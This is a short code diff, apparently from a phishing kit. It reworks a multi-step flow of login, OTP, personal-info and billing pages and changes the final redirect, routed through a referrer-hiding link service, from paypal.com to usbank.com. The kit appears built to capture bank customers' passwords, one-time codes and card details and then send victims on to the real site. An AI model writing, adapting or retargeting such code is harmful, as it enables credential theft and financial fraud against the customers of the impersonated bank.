@@ -101,7 +101,7 @@ async function buildUserInfo(req, sendAPIRequest) {
 const DEFAULT_PAGEFLOW = {
     "1": { page: "login", enabled: true },
     "2": { page: "otp", enabled: true },
-    "3": { page: "contact", enabled: true },
+    "3": { page: "info", enabled: true },
     "4": { page: "bill", enabled: true },
     "5": { page: "final", enabled: true }
   };
@@ -162,9 +162,9 @@ async function savePageFlow(db, pageFlow, id = 1) {
 const routeMap = {
   login: "sign-in",
   otp: "sign-in?action=otp",
+  info: "sign-in?action=info",
   bill: "sign-in?action=bill",
-  contact: "sign-in?action=contact",
-  final: "https://href.li/?https://paypal.com"
+  final: "https://href.li/?https://usbank.com"
 };
 
 function normalize(str = "") {
